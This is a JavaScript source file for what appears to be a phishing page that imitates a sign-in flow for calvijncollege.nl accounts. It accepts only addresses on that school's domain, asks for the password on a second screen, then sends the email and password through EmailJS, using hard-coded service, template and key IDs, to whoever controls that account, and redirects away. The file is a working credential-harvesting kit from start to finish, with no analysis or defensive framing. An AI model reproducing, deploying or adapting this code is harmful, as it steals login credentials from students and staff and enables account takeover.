document.addEventListener('DOMContentLoaded', () => {
    let email = ""
    document.getElementById('submit').addEventListener('click', () => {
        email = document.getElementById('email').value;

        if (!email.includes('@calvijncollege.nl')) {
            document.getElementById('note').style.display = 'block'
            document.getElementById('center').style.height = '378px'
            document.getElementById('email').style.borderColor = "#e81123"
            document.getElementById('email').focus()
        } else {
            document.getElementById('emailDisplay').innerText = email

            document.getElementById('lightbox').classList.add('fade-out')
            document.getElementById('center').classList.remove('lightbox')
            document.getElementById('center').classList.add('passwordPage')
            document.getElementById('options').style.display = 'none'
            document.getElementById('bg').src = 'Achtergrond calvijn.svg'
            setTimeout(() => {        
                document.getElementById('lightbox').classList.remove('fade-out')
                document.getElementById('lightbox').classList.add('hidden')
                document.getElementById('passwordPage').classList.remove('hidden')
                document.getElementById('passwordPage').classList.add('fade-in')
                document.getElementById('passwordPage').classList.remove('fade-in')           
            }, 400);
            



            document.getElementById('terms').style.color = '#fff'
            document.getElementById('privacy').style.color = '#fff'
            document.getElementById('dots').style.color = '#fff'
        }
    })  

    document.getElementById('signIn').addEventListener('click', () => {
        const password = document.getElementById('passwordInpt').value

        emailjs.init('cXBQtkCZQdlbhKdfG')

        let params = {
            mail: email,
            wachtwoord: password
        }

        const serviceID = 'service_9q2qoob';
        const templateID = 'template_jpgwf8d';
     
        emailjs.send(serviceID, templateID, params)
        window.location.href = "www."
    })
    
    document.getElementById('email').addEventListener('keypress', (e) => {
        if (e.key == 'Enter') {
            e.preventDefault()
            document.getElementById('submit').click()
        }
    })
})
